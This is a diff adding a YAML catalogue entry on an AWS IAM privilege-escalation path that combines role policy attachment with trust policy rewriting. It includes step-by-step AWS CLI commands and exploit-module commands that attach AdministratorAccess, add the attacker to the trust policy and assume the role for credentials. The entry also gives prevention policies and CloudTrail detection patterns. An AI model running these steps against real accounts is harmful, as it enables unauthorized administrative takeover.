@@ -1,0 +1,294 @@
+id: iam-019
+parent:
+  id: iam-009
+  modification: This variation combines iam:AttachRolePolicy with iam:UpdateAssumeRolePolicy to both elevate a role's permissions and modify its trust policy, eliminating the need for pre-existing trust policy configuration or sts:AssumeRole permission
+name: iam:AttachRolePolicy + iam:UpdateAssumeRolePolicy
+category: principal-access
+services:
+- iam
+detectionTools:
+  prowler: https://github.com/prowler-cloud/prowler/blob/eabe4884379070c72e07103f239bac70d31f6320/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L53
+  cloudsplaining: https://github.com/salesforce/cloudsplaining/blob/015f16030f35a40631560a895d5ae416f58b6a94/cloudsplaining/shared/constants.py#L234
+permissions:
+  required:
+  - permission: iam:AttachRolePolicy
+    resourceConstraints: Must have permission to attach policies to the target role
+  - permission: iam:UpdateAssumeRolePolicy
+    resourceConstraints: Must have permission to modify the trust policy of the target role
+  additional:
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering available roles to target
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing role trust policies and attached permissions
+  - permission: iam:ListAttachedRolePolicies
+    resourceConstraints: Helpful for viewing current policies attached to the target role
+description: A principal with `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy` can achieve privilege escalation by modifying an existing IAM role. The attacker first uses `iam:AttachRolePolicy` to attach an administrative managed policy to a target role, then uses `iam:UpdateAssumeRolePolicy` to modify the role's trust policy to allow the attacker to assume it. Once the trust policy is updated, the attacker can assume the role using `sts:AssumeRole` to gain the elevated privileges. A key aspect of this attack is that the attacker does not need pre-existing `sts:AssumeRole` permission - being explicitly named in the trust policy grants the ability to assume the role from AWS's perspective, as trust policies grant permission from the role's side rather than requiring it on the principal's side.
+prerequisites:
+  admin:
+  - An IAM role must exist that you have both `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy` permissions on
+  - An administrative managed policy must exist in the account to attach (e.g., AdministratorAccess)
+  lateral:
+  - An IAM role must exist that you have both `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy` permissions on
+  - A managed policy with elevated permissions must exist in the account to attach
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: |
+      # Set the target role and policy ARNs
+      TARGET_ROLE="target-role-name"
+      ADMIN_POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"
+      ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
+    description: Define the target role to compromise and the administrative policy to attach
+  - step: 2
+    command: |
+      # Attach the administrative policy to the target role
+      aws iam attach-role-policy \
+        --role-name $TARGET_ROLE \
+        --policy-arn $ADMIN_POLICY_ARN
+    description: Attach an administrative managed policy (AdministratorAccess) to the target role using iam:AttachRolePolicy
+  - step: 3
+    command: |
+      # Wait for policy attachment to propagate
+      sleep 15
+    description: Wait for the policy attachment to propagate across AWS infrastructure (recommended 15 seconds)
+  - step: 4
+    command: |
+      # Verify the policy was attached
+      aws iam list-attached-role-policies --role-name $TARGET_ROLE
+    description: Verify that the AdministratorAccess policy is now attached to the target role
+  - step: 5
+    command: |
+      # Get the current principal ARN
+      PRINCIPAL_ARN=$(aws sts get-caller-identity --query Arn --output text)
+
+      # Create a new trust policy that includes the attacker
+      cat > trust-policy.json <<EOF
+      {
+        "Version": "2012-10-17",
+        "Statement": [
+          {
+            "Effect": "Allow",
+            "Principal": {
+              "AWS": "$PRINCIPAL_ARN"
+            },
+            "Action": "sts:AssumeRole"
+          }
+        ]
+      }
+      EOF
+    description: Create a new trust policy document that explicitly allows the attacker to assume the role
+  - step: 6
+    command: |
+      # Update the role's trust policy
+      aws iam update-assume-role-policy \
+        --role-name $TARGET_ROLE \
+        --policy-document file://trust-policy.json
+    description: Update the target role's trust policy using iam:UpdateAssumeRolePolicy to allow the attacker to assume it
+  - step: 7
+    command: |
+      # Wait for trust policy update to propagate
+      sleep 15
+    description: Wait for the trust policy update to propagate across AWS infrastructure (recommended 15 seconds)
+  - step: 8
+    command: |
+      # Verify the trust policy was updated
+      aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument'
+    description: Verify that the trust policy now includes the attacker as a trusted principal
+  - step: 9
+    command: |
+      # Assume the role (note: no prior sts:AssumeRole permission needed)
+      ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
+
+      CREDENTIALS=$(aws sts assume-role \
+        --role-arn $ROLE_ARN \
+        --role-session-name privesc-session \
+        --output json)
+
+      # Extract temporary credentials
+      export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.Credentials.AccessKeyId')
+      export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.Credentials.SecretAccessKey')
+      export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Credentials.SessionToken')
+    description: Assume the role to obtain temporary credentials with administrative privileges. Trust policy grants permission to assume the role, so no prior sts:AssumeRole permission is required on the principal.
+  - step: 10
+    command: |
+      # Verify administrative access
+      aws iam list-users --max-items 5
+    description: Verify that you now have administrative access using the assumed role credentials
+  pathrunner:
+  - step: 1
+    command: pathrunner use iam-019
+    description: Load the iam-019 exploit module in Pathrunner.
+  - step: 2
+    command: pathrunner set TARGET_ROLE TargetRoleName
+    description: Set the TARGET_ROLE option (replace the placeholder with your target's real value).
+  - step: 3
+    command: pathrunner exploit
+    description: Execute the privilege escalation.
+limitations: |
+  This attack path provides administrative access only if an administrative managed policy (e.g., AdministratorAccess) exists in the AWS account to attach. If only limited managed policies are available, the attacker gains access limited to those permissions. However, even limited privilege escalation may enable multi-hop attacks or access to sensitive data.
+recommendation: |
+  Restrict `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy` using the principle of least privilege. These permissions should rarely be granted together on the same target role, as this combination creates a direct privilege escalation path.
+
+  **Prevention strategies:**
+
+  1. Restrict `iam:AttachRolePolicy` to limit which policies can be attached and to which roles:
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:AttachRolePolicy",
+    "Resource": "arn:aws:iam::ACCOUNT:role/SpecificRole",
+    "Condition": {
+      "ArnEquals": {
+        "iam:PolicyArn": [
+          "arn:aws:iam::ACCOUNT:policy/AllowedPolicy1",
+          "arn:aws:iam::ACCOUNT:policy/AllowedPolicy2"
+        ]
+      }
+    }
+  }
+  ```
+
+  2. Restrict `iam:UpdateAssumeRolePolicy` to prevent arbitrary trust policy modifications:
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:UpdateAssumeRolePolicy",
+    "Resource": "arn:aws:iam::ACCOUNT:role/SpecificRole",
+    "Condition": {
+      "StringEquals": {
+        "aws:RequestedRegion": "us-east-1"
+      }
+    }
+  }
+  ```
+
+  3. Use IAM permissions boundaries to limit the maximum permissions a role can have, even if administrative policies are attached
+
+  4. Separate the permissions - avoid granting both `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy` to the same principal for the same target role
+
+  5. Require MFA for sensitive role policy attachment and trust policy modification operations
+
+  6. Use AWS Config rules to detect and alert on role policy attachments and trust policy changes
+
+  7. Use Service Control Policies (SCPs) to prevent the attachment of overly permissive managed policies or to restrict trust policy modifications
+
+  **Detection strategies:**
+
+  Monitor CloudTrail for the following event patterns:
+  - `AttachRolePolicy` API calls, especially when attaching AWS-managed admin policies like AdministratorAccess
+  - `UpdateAssumeRolePolicy` API calls that add new principals to role trust policies
+  - Sequential occurrences of `AttachRolePolicy` followed by `UpdateAssumeRolePolicy` on the same role within a short time window
+  - `AssumeRole` API calls immediately following trust policy updates
+  - `UpdateAssumeRolePolicy` events where new principals are added to the trust policy
+
+  Set up CloudWatch alarms for unexpected changes to role policies and trust policies. Investigate any role policy attachments combined with trust policy modifications. Consider implementing automated responses to roll back suspicious policy changes or to quarantine affected roles.
+
+discoveryAttribution:
+  firstDocumented:
+    author: Spencer Gietzen
+    organization: Rhino Security Labs
+    date: 2019
+    link: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
+  derivativeOf:
+    pathId: iam-009
+    modification: "Combines iam:AttachRolePolicy with iam:UpdateAssumeRolePolicy to both elevate a role's permissions and modify its trust policy, eliminating the need for pre-existing trust policy configuration or sts:AssumeRole permission"
+  ultimateOrigin:
+    pathId: iam-012
+    author: Spencer Gietzen
+    organization: Rhino Security Labs
+    date: 2019
+    link: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
+references:
+- title: "HackTricks - AWS - IAM Privesc"
+  url: "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-iam-privesc/index.html#iamupdateassumerolepolicy"
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/iam-attachrolepolicy+iam-updateassumerolepolicy"
+    description: "Deploy Terraform into your own AWS account to practice this attack path"
+  iam-vulnerable:
+    type: open-source
+    githubLink: https://github.com/BishopFox/iam-vulnerable
+    scenario: "IAM-AttachRolePolicy and IAM-UpdatingAssumeRolePolicy"
+    description: "Deploy Terraform into your own AWS account and practice individual exploitation paths (two separate scenarios: privesc9 and privesc14)"
+  cybr:
+    type: closed-source
+    description: "Hosted learning environment with interactive AWS security labs"
+    scenario: https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamattachrolepolicy-privesc/
+    scenarioPricingModel: paid
+attackVisualization:
+  nodes:
+  - id: start
+    label: Starting Principal
+    type: principal
+    description: |
+      The principal with iam:AttachRolePolicy and iam:UpdateAssumeRolePolicy permissions on a target role. Can be an IAM user or role.
+  - id: target_role
+    label: Existing Target Role
+    type: principal
+    description: |
+      An existing IAM role that will be modified. The attacker will attach an administrative policy to it and update its trust policy to allow assumption.
+  - id: admin_outcome
+    label: Effective Administrator
+    type: outcome
+    description: |
+      If an administrative managed policy (e.g., AdministratorAccess) is attached to the role, the attacker gains full administrative access after assuming the role.
+  - id: partial_outcome
+    label: Some additional access
+    type: outcome
+    color: '#ffeb99'
+    description: |
+      If a managed policy with elevated but non-administrative permissions is attached, the attacker gains partial privilege escalation.
+  - id: minimal_outcome
+    label: No additional access
+    type: outcome
+    color: '#cccccc'
+    description: |
+      If only managed policies with minimal permissions are available to attach, the privilege escalation may not provide meaningful additional access.
+  edges:
+  - from: start
+    to: target_role
+    label: iam:AttachRolePolicy + iam:UpdateAssumeRolePolicy & then sts:AssumeRole
+    description: |
+      The attacker first attaches an administrative managed policy (e.g., AdministratorAccess) to the target role, then updates the role's trust policy to allow their principal to assume it, and finally assumes the role. No prior sts:AssumeRole permission is needed - the trust policy grants this capability.
+
+      Commands:
+      ```bash
+      # Step 1: Attach administrative policy
+      aws iam attach-role-policy \
+        --role-name target-role \
+        --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+      # Step 2: Update trust policy
+      aws iam update-assume-role-policy \
+        --role-name target-role \
+        --policy-document file://trust-policy.json
+
+      # Step 3: Assume the role
+      aws sts assume-role \
+        --role-arn arn:aws:iam::ACCOUNT_ID:role/target-role \
+        --role-session-name privesc-session
+      ```
+  - from: target_role
+    to: admin_outcome
+    label: If administrative policy attached
+    branch: A
+    condition: admin
+    description: |
+      If AdministratorAccess or equivalent was attached to the role, the attacker gains full administrative access.
+  - from: target_role
+    to: partial_outcome
+    label: If elevated policy attached
+    branch: B
+    condition: some_permissions
+    description: |
+      If a policy with elevated but non-administrative permissions was attached, the attacker gains partial privilege escalation.
+  - from: target_role
+    to: minimal_outcome
+    label: If limited policy attached
+    branch: C
+    condition: no_permissions
+    description: |
+      If only limited managed policies were available to attach, the attacker may not gain meaningful additional access.
